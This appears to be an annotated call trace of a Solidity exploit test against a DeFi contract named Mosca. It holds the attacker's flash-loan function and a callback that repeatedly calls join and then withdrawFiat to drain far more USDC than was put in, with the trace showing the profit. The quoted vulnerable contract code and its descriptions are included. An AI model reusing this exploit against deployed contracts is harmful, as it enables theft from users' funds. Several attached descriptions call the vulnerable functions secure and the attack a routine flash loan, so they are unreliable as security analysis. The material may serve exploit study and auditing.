[
    {
        "id": "812733",
        "args": "",
        "original_code": "    function testExploit() public balanceLog {\n        uint256 baseAmount = 0;\n        uint256 quoteAmonut = 7_000_000_000_000_000_000_000;\n        address assetTo = address(this);\n        bytes memory data = abi.encode(\"0xdead\");\n        IDODO(DPP).flashLoan(baseAmount, quoteAmonut, assetTo, data);\n    }\n\n",
        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate a flash loan operation. Flash loans allow users to borrow assets without collateral, provided the borrowed amount is returned within the same transaction. In this case, the function attempts to borrow a specific amount of a quote asset (a large number) and specifies the recipient as the contract itself. The function also includes encoded data, which could represent additional instructions or parameters for the flash loan.\n\n2. **Security mechanism**:  \n   The function uses the `balanceLog` modifier, which likely checks or logs the balance of assets before and after the flash loan operation to ensure no unexpected changes occur. This acts as a safeguard to monitor the contract's state during the transaction. Additionally, the use of `abi.encode` for the `data` parameter ensures that the data is properly formatted and secure for transmission.\n\n3. **Parameter Function**:  \n   - `baseAmount`: Represents the amount of the base asset to borrow, set to `0` here, meaning no base asset is borrowed.  \n   - `quoteAmonut`: Represents the amount of the quote asset to borrow, set to a very large number (`7_000_000_000_000_000_000_000`).  \n   - `assetTo`: Specifies the recipient of the borrowed assets, set to the contract itself (`address(this)`).  \n   - `data`: Encoded data that may contain additional instructions or parameters for the flash loan, set to `abi.encode(\"0xdead\")`.\n\n4. **Return description**:  \n   The function does not explicitly return a value. Instead, it triggers a flash loan operation through the `IDODO(DPP).flashLoan` call. The success or failure of this operation depends on the implementation of the `flashLoan` function in the `IDODO` contract and whether the borrowed assets are returned within the same transaction.\n\n**In summary**,  \nThe `testExploit` function simulates a flash loan operation by borrowing a large amount of a quote asset and specifying the contract itself as the recipient. It uses the `balanceLog` modifier to monitor asset balances and ensures secure data encoding. The function does not return a value but relies on the `flashLoan` operation's success.",
        "return_value": "Returned"
    },
    {
        "id": "10328",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "\"USDC\""
    },
    {
        "id": "3082",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "\"USDC\""
    },
    {
        "id": "3296",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "2553",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "3076",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "18"
    },
    {
        "id": "2336",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "18"
    },
    {
        "id": "754645",
        "args": "0, 7000000000000000000000 [7e21], Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000063078646561640000000000000000000000000000000000000000000000000000",
        "original_code": "",
        "description": "",
        "return_value": "Returned"
    },
    {
        "id": "751934",
        "args": "0, 7000000000000000000000 [7e21], Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000063078646561640000000000000000000000000000000000000000000000000000",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "12871",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7000000000000000000000 [7e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "710128",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 7000000000000000000000 [7e21], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000063078646561640000000000000000000000000000000000000000000000000000",
        "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        IERC20(BUSD).approve(Mosca, type(uint).max);\n        IERC20(USDC).approve(Mosca, type(uint).max);\n        for(uint256 i=0;i<7;i++) {\n            uint256 amount = 1_000_000_000_000_000_000_000;\n            uint256 _refCode = 0;\n            uint8 fiat = 1;\n            bool enterpriseJoin = false;\n            IMosca(Mosca).join(amount, _refCode, fiat, enterpriseJoin);\n        }\n\n        IMosca(Mosca).withdrawFiat(18_671_180_855_284_200_248_407, false, 1);\n        IMosca(Mosca).withdrawFiat(26_648_013_000_000_000_000_000, false, 0);\n\n        IERC20(BUSD).transfer(DPP, quoteAmount);\n    }\n",
        "description": "1. Core functions:  \nThis function is designed to handle a flash loan operation. It first approves the transfer of two types of tokens (BUSD and USDC) to a specific contract (Mosca) with the maximum possible amount. Then, it repeatedly calls a `join` function on the Mosca contract seven times, each time with a fixed large amount and specific parameters. After that, it performs two `withdrawFiat` operations on the Mosca contract with predefined amounts and flags. Finally, it transfers a specified amount of BUSD tokens to another address (DPP).\n\n2. Security mechanism:  \nThe function uses `external` visibility, meaning it can only be called from outside the contract. It also relies on the `approve` function to allow the Mosca contract to spend tokens on its behalf, but it sets the approval to the maximum possible value (`type(uint).max`), which could be risky if not properly managed. The function does not include explicit checks for reentrancy or access control, which could leave it vulnerable to attacks if the Mosca contract or external calls are malicious.\n\n3. Parameter Function:  \n- `sender`: The address initiating the flash loan call.  \n- `baseAmount`: Not directly used in the function but could represent the amount of a base token involved in the operation.  \n- `quoteAmount`: Specifies the amount of BUSD tokens to be transferred to the DPP address at the end of the function.  \n- `data`: Additional data passed to the function, though it is not utilized in this implementation.  \n\n4. Return description:  \nThis function does not return any value. Its purpose is to execute a series of operations involving token approvals, contract interactions, and token transfers, rather than computing and returning a result.  \n\nIn summary, this function performs a flash loan operation by approving token transfers, interacting with the Mosca contract multiple times, and transferring tokens to a specified address. It lacks explicit security measures like reentrancy protection or access control, which could pose risks if not addressed.",
        "return_value": "Returned"
    },
    {
        "id": "24562",
        "args": "0xd8791F0C10B831B605C5D48959EB763B266940B9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "25308",
        "args": "0xd8791F0C10B831B605C5D48959EB763B266940B9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "24562",
        "args": "0xd8791F0C10B831B605C5D48959EB763B266940B9, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "271915",
        "args": "1000000000000000000000 [1e21], 0, 1, false",
        "original_code": "     function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant{\n           User storage user = users[msg.sender];\n           uint256 diff = user.balance > 127 * 10 ** 18 ? user.balance - 127 * 10 ** 18 : 0;\n            uint256 tax_remainder;\n\n           uint256 baseAmount = ((amount + diff) * 1000) / 1015;\n          \n       \n\n      \n            if(enterpriseJoin) {\n                \n                if(refByAddr[msg.sender] == 0) {\n                    require(amount >= (ENTERPRISE_JOIN_FEE * 3) + (JOIN_FEE * 3), \"Insufficient amount sent to join enterprise\");\n                    if(fiat == 1){\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, feeReceiver, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    \n                    \n                    } else {\n                        require(usdc.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                        require(usdc.transferFrom(msg.sender, feeReceiver, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    }\n\n                    emit AdminFeesSent(owner, block.timestamp, ENTERPRISE_TAX * 3, fiat);\n\n                } else {\n                    \n                    require(amount + diff >= (ENTERPRISE_JOIN_FEE * 3), \"Insufficient amount to upgrade to enterprise\");\n                    if(diff < ENTERPRISE_TAX * 3){\n                        tax_remainder = (ENTERPRISE_TAX * 3) - diff;\n                        adminBalance+= (ENTERPRISE_TAX * 3) - diff;\n                        user.balance -= diff;\n                        diff = 0;\n                        \n\n                         if(fiat == 1){\n                            require(usdt.transferFrom(msg.sender, feeReceiver, tax_remainder), \"Transfer failed\");\n                        } else {\n                            require(usdc.transferFrom(msg.sender, feeReceiver, tax_remainder), \"Transfer failed\");\n                        }\n\n                        emit AdminFeesSent(owner, block.timestamp, tax_remainder, fiat);\n\n                    } else {\n                        adminBalance+= ENTERPRISE_TAX * 3;\n                        diff -= ENTERPRISE_TAX * 3;\n                         user.balance -= ENTERPRISE_TAX * 3; \n                        if(diff > ENTERPRISE_JOIN_FEE * 3){\n                            user.balance -= (ENTERPRISE_JOIN_FEE * 3);\n                        } else {\n                            user.balance -= diff;\n                        }\n                       \n\n                    }\n\n                      if(amount > 0) {\n\n                        if(fiat == 1){\n\n                            require(usdt.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        } else {\n\n                            require(usdc.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        }\n\n\n                        }\n                    \n                    \n\n                  \n\n                }\n                user.enterprise = true;\n            } else {\n\n                require(amount >= JOIN_FEE, \"Insufficient amount sent\");\n\n\n                if(fiat == 1){\n\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, feeReceiver, TAX * 3), \"Transfer failed\");\n                } else {\n\n                     require(usdc.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdc.transferFrom(msg.sender, feeReceiver, TAX * 3), \"Transfer failed\");\n\n                }\n\n                emit AdminFeesSent(owner, block.timestamp, TAX * 3, fiat);\n\n                \n\n\n            }\n        \n        \n      \n       user.nextDeadline = block.timestamp + 28 days;\n       user.bonusDeadline = block.timestamp + 7 days;\n       user.walletAddress = msg.sender;\n        totalRevenue+= amount;\n        user.balance += enterpriseJoin ? baseAmount - ENTERPRISE_JOIN_FEE : baseAmount - JOIN_FEE;\n\n     \n\n        if(referrers[_refCode] != address(0)){\n            user.collectiveCode = _refCode;\n            users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n            users[referrers[user.collectiveCode]].inviteCount++;\n            emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            if(users[referrers[user.collectiveCode]].inviteCount % 3 == 0){\n                users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n                emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            }\n\n        }\n\n        rewardQueue.push(msg.sender);\n\n        if(refByAddr[msg.sender] == 0){\n        generateRefCode(msg.sender);\n        }\n\n        emit Joined(msg.sender, block.timestamp, amount, fiat);\n\n       cascade(msg.sender);\n\n        distributeFees(msg.sender, amount);\n        \n     }\n",
        "description": "1. **Core functions:**  \n   The `join` function allows a user to participate in a system, either as a regular user or as an enterprise user. It handles the process of joining, including transferring funds, calculating fees, updating user balances, and managing referral rewards. The function also ensures that users meet specific requirements based on their chosen participation type (regular or enterprise).\n\n2. **Security mechanism:**  \n   - **`nonReentrant` modifier:** Prevents reentrancy attacks by ensuring the function cannot be called again before it completes.  \n   - **`require` statements:** Enforce conditions such as minimum amounts, successful token transfers, and valid inputs to prevent invalid operations.  \n   - **Token transfer checks:** Ensures that token transfers (USDT or USDC) are successful before proceeding.  \n   - **Emission of events:** Logs important actions (e.g., fees sent, rewards earned) for transparency and auditing.  \n\n3. **Parameter Function:**  \n   - **`amount`:** The amount of funds the user is contributing.  \n   - **`_refCode`:** A referral code associated with the user, used to track and reward referrals.  \n   - **`fiat`:** Specifies the type of token being used (e.g., USDT or USDC).  \n   - **`enterpriseJoin`:** A boolean flag indicating whether the user is joining as an enterprise user or a regular user.  \n\n4. **Return description:**  \n   The function does not return a value directly. Instead, it updates the user's balance, referral rewards, and other internal state variables. It also emits events to log actions like fees sent, rewards earned, and successful joins. The logic ensures that fees are deducted, balances are updated, and referral rewards are distributed based on the user's participation type and referral activity.  \n\n**In summary,**  \nThe `join` function facilitates user participation in a system, handling fund transfers, fee calculations, and referral rewards. It includes security measures like reentrancy protection and input validation, and it updates user balances and emits events to track actions. The function's parameters determine the user's contribution amount, referral code, token type, and participation type.",
        "return_value": "Returned"
    },
    {
        "id": "10834",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "10834",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "51512",
        "args": "1000000000000000000000 [1e21], 0, 1, false",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "51512",
        "args": "1000000000000000000000 [1e21], 0, 1, false",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "51512",
        "args": "1000000000000000000000 [1e21], 0, 1, false",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "51512",
        "args": "1000000000000000000000 [1e21], 0, 1, false",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "51512",
        "args": "1000000000000000000000 [1e21], 0, 1, false",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "51512",
        "args": "1000000000000000000000 [1e21], 0, 1, false",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd8791F0C10B831B605C5D48959EB763B266940B9, 991000000000000000000 [9.91e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "6034",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD7CFeEDBB70463F66b3fA1449812A162A53586C5, 9000000000000000000 [9e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "19569",
        "args": "18671180855284200248407 [1.867e22], false, 1",
        "original_code": "    function withdrawFiat(uint256 amount, bool isFiat, uint8 fiatToWithdraw) external nonReentrant {\n        require(!isBlacklisted[msg.sender], \"Blacklisted user\");\n         User storage user = users[msg.sender];\n         uint limit = user.enterprise ? 127 * 10 ** 18 : 28 * 10 ** 18;\n         uint balance; \n          uint256 baseAmount = (amount * 1000) / 1015;\n         if(!isFiat) {\n             balance = user.balance; \n\n         } else {\n              balance = fiatToWithdraw == 1 ? user.balanceUSDT  : user.balanceUSDC ;\n         }\n\n          require(amount <= balance - limit, \"Insufficient balance\");\n\n          if (!isFiat){\n            user.balance -= amount;\n          }\n          else {\n           fiatToWithdraw == 1 ? user.balanceUSDT -= amount  : user.balanceUSDC -= amount ;\n          }\n           \n       \n        \n\n        fiatToWithdraw == 1 ? usdt.transfer(msg.sender, baseAmount) : usdc.transfer(msg.sender, baseAmount);\n\n        if(!isFiat) {\n            \n            distributeFees(msg.sender, amount);\n             \n         } else {\n              distributeFeesFiat(msg.sender, amount, fiatToWithdraw);\n         }\n        \n\n        emit WithdrawFiat(msg.sender, block.timestamp, amount, fiatToWithdraw);\n\n        \n\n    }\n    \n",
        "description": "1. **Core functions:**  \n   The main purpose of this function is to allow users to withdraw funds, either in the form of a specific cryptocurrency (like USDT or USDC) or another type of balance. It checks the user's eligibility, ensures they have enough funds, deducts the requested amount from their balance, and transfers the funds to them. Additionally, it distributes fees based on the type of withdrawal and logs the transaction.\n\n2. **Security mechanism:**  \n   - The `nonReentrant` modifier is used to prevent reentrancy attacks, ensuring the function cannot be called repeatedly before it completes.  \n   - A `require` statement checks if the user is blacklisted, stopping unauthorized or flagged users from withdrawing funds.  \n   - Another `require` statement ensures the user has sufficient balance to cover the withdrawal amount plus a predefined limit.  \n\n3. **Parameter Function:**  \n   - `amount`: Specifies the amount of funds the user wants to withdraw.  \n   - `isFiat`: Determines whether the withdrawal is for a specific cryptocurrency (like USDT or USDC) or another type of balance.  \n   - `fiatToWithdraw`: Indicates which cryptocurrency to withdraw (e.g., USDT or USDC) if `isFiat` is true.  \n\n4. **Return description:**  \n   The function does not return a value directly. Instead, it performs calculations to adjust the user's balance and transfer the funds. The `baseAmount` is calculated by reducing the requested amount by a small percentage (to account for fees). The adjusted amount is then transferred to the user, and the user's balance is updated accordingly.  \n\n**In summary,**  \nThis function enables users to withdraw funds securely, ensuring they meet eligibility and balance requirements. It handles different types of withdrawals, deducts fees, and logs the transaction while protecting against reentrancy attacks and unauthorized access.",
        "return_value": "Returned"
    },
    {
        "id": "6071",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18395252074171625860499 [1.839e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "42248",
        "args": "26648013000000000000000 [2.664e22], false, 0",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "28739",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26254200000000000000000 [2.625e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "27993",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26254200000000000000000 [2.625e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "3271",
        "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476, 7000000000000000000000 [7e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2534",
        "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
        "original_code": null,
        "description": null,
        "return_value": "242321616220426827935 [2.423e20]"
    },
    {
        "id": "531",
        "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
        "original_code": null,
        "description": null,
        "return_value": "252768744407906267874861 [2.527e23]"
    },
    {
        "id": "534",
        "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
        "original_code": null,
        "description": null,
        "return_value": "242321616220426827935 [2.423e20]"
    },
    {
        "id": "531",
        "args": "0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476",
        "original_code": null,
        "description": null,
        "return_value": "252768744407906267874861 [2.527e23]"
    },
    {
        "id": "1828",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "\"USDC\""
    },
    {
        "id": "1082",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "\"USDC\""
    },
    {
        "id": "1296",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "26254200000000000000000 [2.625e22]"
    },
    {
        "id": "553",
        "args": "Mosca2: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "26254200000000000000000 [2.625e22]"
    },
    {
        "id": "1076",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "18"
    },
    {
        "id": "336",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "18"
    }
]